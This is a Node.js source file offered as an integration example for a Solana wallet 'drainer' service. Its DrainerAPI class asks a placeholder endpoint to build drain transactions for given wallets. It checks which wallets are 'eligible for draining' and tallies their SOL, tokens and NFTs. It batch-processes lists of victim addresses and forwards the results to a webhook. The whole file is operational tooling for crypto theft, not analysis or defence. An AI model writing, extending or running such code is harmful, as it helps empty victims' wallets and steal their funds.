/**
 * Node.js API Integration Example
 * Shows how to integrate the drainer API programmatically
 */

const fetch = require('node-fetch');

class DrainerAPI {
  constructor(apiUrl) {
    this.apiUrl = apiUrl || 'https://your-domain.com/api/drainer';
  }

  /**
   * Generate drain transaction for a wallet
   * @param {string} walletAddress - Solana wallet address
   * @returns {Promise<Object>} Transaction data
   */
  async generateTransaction(walletAddress) {
    try {
      const response = await fetch(`${this.apiUrl}?user=${walletAddress}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
        }
      });

      if (!response.ok) {
        const errorData = await response.json();
        throw new Error(errorData.error || `HTTP ${response.status}: ${response.statusText}`);
      }

      const data = await response.json();
      return data;
    } catch (error) {
      console.error('Error generating transaction:', error);
      throw error;
    }
  }

  /**
   * Generate transaction using POST method
   * @param {string} walletAddress - Solana wallet address
   * @returns {Promise<Object>} Transaction data
   */
  async generateTransactionPOST(walletAddress) {
    try {
      const response = await fetch(this.apiUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          user: walletAddress
        })
      });

      if (!response.ok) {
        const errorData = await response.json();
        throw new Error(errorData.error || `HTTP ${response.status}: ${response.statusText}`);
      }

      const data = await response.json();
      return data;
    } catch (error) {
      console.error('Error generating transaction:', error);
      throw error;
    }
  }

  /**
   * Check if wallet is eligible for draining
   * @param {string} walletAddress - Solana wallet address
   * @returns {Promise<boolean>} True if eligible
   */
  async checkEligibility(walletAddress) {
    try {
      const data = await this.generateTransaction(walletAddress);
      return data.success === true;
    } catch (error) {
      if (error.message.includes('INSUFFICIENT_FUNDS')) {
        return false;
      }
      throw error;
    }
  }

  /**
   * Get wallet drain information
   * @param {string} walletAddress - Solana wallet address
   * @returns {Promise<Object>} Drain information
   */
  async getDrainInfo(walletAddress) {
    try {
      const data = await this.generateTransaction(walletAddress);
      return {
        eligible: true,
        metadata: data.metadata,
        transactionSize: data.metadata.size,
        estimatedSOL: data.metadata.solAmount / 1e9,
        tokenCount: data.metadata.tokens,
        nftCount: data.metadata.nfts
      };
    } catch (error) {
      if (error.message.includes('INSUFFICIENT_FUNDS')) {
        return {
          eligible: false,
          reason: 'Insufficient funds',
          message: 'Wallet has no SOL or tokens to drain'
        };
      }
      throw error;
    }
  }
}

// Example usage
async function example() {
  const drainer = new DrainerAPI('https://your-domain.com/api/drainer');
  
  // Test wallet addresses
  const testWallets = [
    '4dGUJf1CtJSNfgJSwHjEfiRSyT9YJGeNf3V9LjMREHiq',
    '7AddBGJ5fiZ8Shiw62hBKVjU7HihihwQo8wxxU94QTZe',
    '3F2D7izX8gYkSwXwSyWoKB1dob53MDMCxqBVpPUEc8sz'
  ];

  console.log('🔍 Checking wallet eligibility...\n');

  for (const wallet of testWallets) {
    try {
      console.log(`Wallet: ${wallet.substring(0, 8)}...`);
      
      const drainInfo = await drainer.getDrainInfo(wallet);
      
      if (drainInfo.eligible) {
        console.log(`✅ Eligible for draining`);
        console.log(`   SOL: ${drainInfo.estimatedSOL} SOL`);
        console.log(`   Tokens: ${drainInfo.tokenCount}`);
        console.log(`   NFTs: ${drainInfo.nftCount}`);
        console.log(`   Transaction size: ${drainInfo.transactionSize} bytes`);
      } else {
        console.log(`❌ Not eligible: ${drainInfo.reason}`);
      }
      
      console.log('');
      
    } catch (error) {
      console.log(`❌ Error: ${error.message}\n`);
    }
  }
}

// Batch processing example
async function batchProcess(wallets) {
  const drainer = new DrainerAPI('https://your-domain.com/api/drainer');
  const results = [];

  console.log(`🔄 Processing ${wallets.length} wallets...\n`);

  for (let i = 0; i < wallets.length; i++) {
    const wallet = wallets[i];
    
    try {
      console.log(`[${i + 1}/${wallets.length}] Processing ${wallet.substring(0, 8)}...`);
      
      const drainInfo = await drainer.getDrainInfo(wallet);
      results.push({
        wallet,
        ...drainInfo
      });
      
      // Rate limiting - wait 1 second between requests
      if (i < wallets.length - 1) {
        await new Promise(resolve => setTimeout(resolve, 1000));
      }
      
    } catch (error) {
      console.log(`❌ Error processing ${wallet}: ${error.message}`);
      results.push({
        wallet,
        eligible: false,
        error: error.message
      });
    }
  }

  // Summary
  const eligible = results.filter(r => r.eligible);
  const totalSOL = eligible.reduce((sum, r) => sum + (r.estimatedSOL || 0), 0);
  const totalTokens = eligible.reduce((sum, r) => sum + (r.tokenCount || 0), 0);
  const totalNFTs = eligible.reduce((sum, r) => sum + (r.nftCount || 0), 0);

  console.log('\n📊 Batch Processing Summary:');
  console.log(`Total wallets: ${wallets.length}`);
  console.log(`Eligible wallets: ${eligible.length}`);
  console.log(`Total SOL: ${totalSOL.toFixed(4)} SOL`);
  console.log(`Total tokens: ${totalTokens}`);
  console.log(`Total NFTs: ${totalNFTs}`);

  return results;
}

// Webhook integration example
async function webhookIntegration(walletAddress, webhookUrl) {
  const drainer = new DrainerAPI('https://your-domain.com/api/drainer');
  
  try {
    const drainInfo = await drainer.getDrainInfo(walletAddress);
    
    // Send webhook notification
    await fetch(webhookUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        wallet: walletAddress,
        timestamp: new Date().toISOString(),
        ...drainInfo
      })
    });
    
    console.log(`✅ Webhook sent for wallet ${walletAddress.substring(0, 8)}...`);
    
  } catch (error) {
    console.error(`❌ Webhook failed for ${walletAddress}:`, error.message);
  }
}

// Export for use in other modules
module.exports = {
  DrainerAPI,
  example,
  batchProcess,
  webhookIntegration
};

// Run example if this file is executed directly
if (require.main === module) {
  example().catch(console.error);
} 